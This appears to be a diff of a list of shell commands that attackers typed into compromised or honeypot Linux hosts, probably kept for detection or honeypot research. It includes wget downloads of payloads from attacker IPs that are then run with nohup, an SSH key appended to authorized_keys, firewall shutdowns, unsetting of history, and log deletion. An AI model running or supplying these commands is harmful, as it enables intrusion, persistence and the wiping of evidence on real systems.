@@ -1,86 +1,137 @@
-id
-uname -s -v -n
-chmod 0755 /usr/bin/chattr
-uptime
-uname -a
-wget cross-panel.tk/scan/y.txt
-perl y.txt
-ls /usr/bin/chattr  |  |  mv /usr/bin/hast /usr/bin/chattr
-w
-cat /proc/cpuinfo
-ls -a
-cd /var/tmp
-wget
-tar
-screen -r
-ifconfig
+$filename  |  |  (filename="/6004.rar"
+./all 76.45
+./ntpd
+/etc/init.d/iptables stop
+/tmp/.xs/daemon.armv4l.mod
+/tmp/.xs/daemon.i686.mod
+/tmp/.xs/daemon.mips.mod
+/tmp/.xs/daemon.mipsel.mod
+/tmp/.xs/test.mod
+SuSEfirewall2 stop
 apt-egt
 apt-get install python-paramiko
 apt-get install screen
-wget prg.do.am/scan/python.tgz
-tar zxvf python.tgz
-cd .python
-./all 76.45
-/etc/init.d/iptables stop
-service iptables stop
-SuSEfirewall2 stop
-reSuSEfirewall2 stop
-wget -c http://173.254.230.67:9999/wslx
-wget http://112.74.66.152:280/.TSm
-chmod 0755 /root/.TSm
-wget http://89.248.172.166/.bash.sh -O /tmp/.bash.sh
-cd /tmp
-cat /proc/cpuinfocat /proc/cpuinfo
-wget angelfire.com/komales88/muh.tgz
-tar xvf muh.tgz
-rm -rf muh.tgz
-tar xvf muh.jpg
-tar zxvf muh.jpg
-cd /dev/shm
-ps x
-wget http://coxspeed.webs.com/psybnc-linuxRO.tgz
-wget http://www.psybnc.at/download/beta/psyBNC-2.3.2-7.tar.gz
-echo "WinSCP: this is end-of-file:0"
-wget -O /tmp/Maslss http://183.60.204.118:8080/Maslss
-wget http://183.60.204.118:8080/Maslss
-wget http://115.56.41.229:8099/mstaar
-chmod 0755 /root/yxdm.a
-nohup /root/yxdm.a >  /dev/null 2 > &1 &
-wget http://198.15.216.27:2015/xdsy
-ls
-history
-rm -rf /var/run/sftp.pid
-$filename  |  |  (filename="/6004.rar"
-cd /
-pwd
-rm -f $path*  |  |  /dev/null  >  $path
-for list in `echo http://211.110.1.32/ http://107.158.236.138/ `
-do (wget -O $filename $list$filename  |  |  curl -o $filename $list$filename)
 break
+cat  > /tmp/.xs/daemon.armv4l.mod
+cat  > /tmp/.xs/daemon.i686.mod
+cat  > /tmp/.xs/daemon.mips.mod
+cat  > /tmp/.xs/daemon.mipsel.mod
+cat  > /tmp/.xs/test.mod
 cat /etc/hosts
-cd .ssh
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIB8NTwrTVNx8KZwzNj067GiIfz8Vc2DgqvmEatkwH1hjiM/jdrq2VFEAJI75AIdarHo1jVL7ZcpsmiIJQ3Pi+P0JdAXARK8PJEZyRQJLJusucbJeU9FI4drnPceKKthaSjVl/9bWa6ckmrYaFIfnNZtAH9CAWn6TCGb5lDfKdgC5Q== X-remuser"  >  >  authorized_keys
-chmod 700 ~/.ssh
-chmod 600 ~/.ssh/authorized_keys
-mkdir "\,"
+cat /etc/passwd/
+cat /proc/cpuinfo
+cat /proc/cpuinfocat /proc/cpuinfo
+cat /proc/version
+cd
 cd "\,"
 cd ..
-cd ~
-tar xvzf 1.tgz
-wget ftp://honma:honma@210.225.196.37/1.tgz
-ftp 210.225.196.37
-wget mclucian.ucoz.ro/psy.tgz
-tar xvzf psy.tgz
 cd .bash
-rm -rf .bash
-./ntpd
-chmod +x *
-rm -rf "\,"
-cd /var
-ps
-echo 111 > 11
-tar xvf system2.jpg
-lscpu
+cd .python
+cd .ssh
+cd /
+cd /dev/shm
+cd /dev/shm/
 cd /root
+cd /tmp
+cd /var
+cd /var/tmp
+cd ~
+chmod +x *
+chmod +x /tmp/Client64
+chmod +x /tmp/yumos
+chmod 0755 /root/.TSm
+chmod 0755 /root/yxdm.a
+chmod 0755 /usr/bin/chattr
+chmod 600 ~/.ssh/authorized_keys
+chmod 700 ~/.ssh
+chmod 777 /tmp/.xs/daemon.armv4l.mod
+chmod 777 /tmp/.xs/daemon.i686.mod
+chmod 777 /tmp/.xs/daemon.mips.mod
+chmod 777 /tmp/.xs/daemon.mipsel.mod
+chmod 777 /tmp/.xs/test.mod
+do (wget -O $filename $list$filename  |  |  curl -o $filename $list$filename)
+echo "WinSCP: this is end-of-file:0"
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIB8NTwrTVNx8KZwzNj067GiIfz8Vc2DgqvmEatkwH1hjiM/jdrq2VFEAJI75AIdarHo1jVL7ZcpsmiIJQ3Pi+P0JdAXARK8PJEZyRQJLJusucbJeU9FI4drnPceKKthaSjVl/9bWa6ckmrYaFIfnNZtAH9CAWn6TCGb5lDfKdgC5Q== X-remuser"  >  >  authorized_keys
+echo -n test
+echo 111 > 11
+exit
+export
+export HISTFILE=/dev/null
+for list in `echo http://211.110.1.32/ http://107.158.236.138/ `
+ftp 210.225.196.37
+history
+history -n
+id
+ifconfig
+ip a
+ls
+ls -
+ls -a
+ls -al
+ls /usr/bin/chattr  |  |  mv /usr/bin/hast /usr/bin/chattr
+lscpu
+mkdir "\,"
+mkdir /tmp/.xs/
+nano .bashrc
+nano bash_history
+nohup /root/yxdm.a >  /dev/null 2 > &1 &
+nohup /tmp/Client64  >  /dev/null 2 > &1 &
+nohup /tmp/yumos  >  /dev/null 2 > &1 &
+perl
+perl ola.txt
+perl y.txt
+ps
+ps x
+pwd
+reSuSEfirewall2 stop
+rm -f $path*  |  |  /dev/null  >  $path
+rm -rf "\,"
+rm -rf .bash
+rm -rf /var/run/sftp.pid
+rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog
+rm -rf autopsy.tgz
+rm -rf bash.sh
+rm -rf muh.tgz
+screen -r
+service iptables stop
+tar
+tar xvf autopsy.tgz
+tar xvf muh.jpg
+tar xvf muh.tgz
+tar xvf system2.jpg
+tar xvzf 1.tgz
+tar xvzf psy.tgz
+tar zxvf muh.jpg
 tar zxvf psybnc-linux.jpg
+tar zxvf python.tgz
+touch /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog
+uname -a
+uname -s -v -n
+unset HISTFILE
+unset HISTLOG
+unset HISTSAVE
+unset WATCH
+uptime
+vi .bashrc
+w
+wget
+wget -O /tmp/Client64 http://45.34.1.163:801/Client64
+wget -O /tmp/Maslss http://183.60.204.118:8080/Maslss
+wget -O /tmp/yumos http://45.34.1.163:801/yumos
 wget -c http://121.40.51.232:11223/syn20160
+wget -c http://173.254.230.67:9999/wslx
+wget -q http://69.30.223.162/bash.sh
+wget angelfire.com/komales88/muh.tgz
+wget arhiva.pe.hu/autopsy.tgz
+wget arhiva.pe.hu/ola.txt
+wget cross-panel.tk/scan/y.txt
+wget ftp://honma:honma@210.225.196.37/1.tgz
+wget http://112.74.66.152:280/.TSm
+wget http://115.56.41.229:8099/mstaar
+wget http://183.60.204.118:8080/Maslss
+wget http://198.15.216.27:2015/xdsy
+wget http://89.248.172.166/.bash.sh -O /tmp/.bash.sh
+wget http://coxspeed.webs.com/psybnc-linuxRO.tgz
+wget http://www.psybnc.at/download/beta/psyBNC-2.3.2-7.tar.gz
+wget mclucian.ucoz.ro/psy.tgz
+wget prg.do.am/scan/python.tgz
